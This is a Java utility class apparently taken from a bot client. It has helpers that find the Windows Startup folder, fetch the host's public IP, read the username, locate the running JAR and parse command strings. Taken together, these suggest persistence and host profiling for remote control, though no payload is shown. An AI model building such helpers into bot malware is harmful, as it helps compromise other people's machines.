import java.io.File;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.IOException;
import java.net.URL;
import java.net.URI;
import java.util.Random;
import java.util.ArrayList;

class Util {

	public static String findStartup() {
		return System.getProperty("user.home") + "\\Start Menu\\Programs\\Startup\\";
	}

	public static int randomNumber() {
		return (new Random()).nextInt(9999999);
	}

	public static int randomNumber(int max) {
		return (new Random()).nextInt(max);
	}

	public static String getIPAddress() {
		try {
			BufferedReader reader = new BufferedReader(new InputStreamReader((new URL(Constants.IP_ADDR_URL)).openStream()));
			return reader.readLine();
		} catch(IOException ioe) {
			return "IOException thrown: " + ioe.toString();
		}
	}

	public static String getIPAddress(String url) {
		try {
			BufferedReader reader = new BufferedReader(new InputStreamReader((new URL(url)).openStream()));
			return reader.readLine();
		} catch(IOException ioe) {
			return "IOException thrown: " + ioe.toString();
		} catch(Exception e) {
			return "Exception thrown: " + e.toString();
		}
	}

	public static String getUsername() {
		String home = System.getProperty("user.home");
		if(home.endsWith("\\")) {
			home = home.substring(0, home.length() - 1);
		}
		return home.substring(home.lastIndexOf("\\") + 1);
	}

	public static String getJARLoc_OLD() {
		try {
			return (new File(Class.forName("Bot").getProtectionDomain().getCodeSource().getLocation().toURI())).getPath();
		} catch(Exception e) {
			return "null";
		}
	}

	public static String getJARLoc() {
		try {
			String str = Class.forName("Bot").getResource("Bot.class").toURI().toString(); 
			str =  str.substring(0, str.lastIndexOf("!"));
			str = str.replaceAll("jar:file:/", "");
			File file = new File(new URI("file:/" + str));
			return file.getPath();
		} catch(Exception e) {
			return findStartup();
		}
	}

	public static String[] splitArgs(String command) {
		command = command.trim();
		ArrayList<String> argsList = new ArrayList(15);
		int quotes = 0;
		int lastIndex = 0;
		for(int i = 0; i < command.length(); i++) {
			if(command.substring(i, i + 1).equals("\"")) {
				quotes++;
				if(i + 1 == command.length()) {
					argsList.add(command.substring(lastIndex + 1, i + 1));
				}
			} else if(command.substring(i, i + 1).equals(" ")) {
				if(quotes == 0) {
					int offset = (lastIndex != 0) ? 1 : 0;
					argsList.add(command.substring(lastIndex + offset, i));
					lastIndex = i;
				} else if(quotes % 2 == 0) {
					argsList.add(command.substring(lastIndex + 1, i));
					lastIndex = i;
				}
			} else if(i + 1 == command.length()) {
				int offset = (lastIndex != 0) ? 1 : 0;
				argsList.add(command.substring(lastIndex + offset, i + 1));
			}
		}
		argsList.trimToSize();
		Object[] objs = argsList.toArray();
		String[] args = new String[objs.length];
		for(int j = 0; j < objs.length; j++) {
			args[j] = (String)objs[j];
			args[j] = args[j].replaceAll("\"", "");
		}
		return args;
	}

}